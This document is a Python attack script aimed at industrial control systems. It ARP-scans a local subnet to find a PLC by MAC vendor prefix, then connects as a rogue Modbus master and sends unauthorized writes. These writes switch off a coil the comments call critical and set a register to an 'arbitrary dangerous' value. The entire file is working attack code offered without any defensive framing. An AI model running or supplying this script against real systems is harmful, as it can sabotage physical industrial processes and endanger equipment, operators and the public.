from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import time

# Step 1: Network Scan to Find the PLC
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning Network for PLC...")
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    for sent, received in answered_list:
        ip = received.psrc
        mac = received.hwsrc
        print(f"[*] Found Device: IP={ip}, MAC={mac}")

        # Simple heuristic: PLC MAC vendors are usually known, replace with real PLC vendors if needed
        if mac.startswith("00:80:2F") or mac.startswith("00:1A:92"):  # Example MAC prefixes
            print(f"[+] Identified PLC at: {ip}")
            return ip

    print("[!] No PLC found on the network.")
    return None

# Step 2: Rogue Master Execution
def rogue_master_attack(plc_ip, modbus_port=502):
    print(f"[*] Attempting Rogue Master Attack on PLC at {plc_ip}")

    # Connect to the PLC as a rogue Modbus Master
    client = ModbusTcpClient(plc_ip, port=modbus_port)
    
    if not client.connect():
        print("[!] Failed to connect to PLC. Ensure Modbus is enabled.")
        return

    try:
        # Example attack: Writing specific coils/registers
        print("[+] Sending unauthorized Modbus commands...")
        
        # Example: Turn OFF (0) critical process or Turn ON (1) unwanted processes
        client.write_coil(0, False)  # Assuming Coil 0 is critical
        
        # Example: Write dangerous values to registers
        client.write_register(1, 9999)  # Arbitrary dangerous/high value

        print("[+] Commands sent successfully!")
    except Exception as e:
        print(f"[!] Attack failed: {e}")

    client.close()

# Main Execution Flow
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        rogue_master_attack(plc_ip)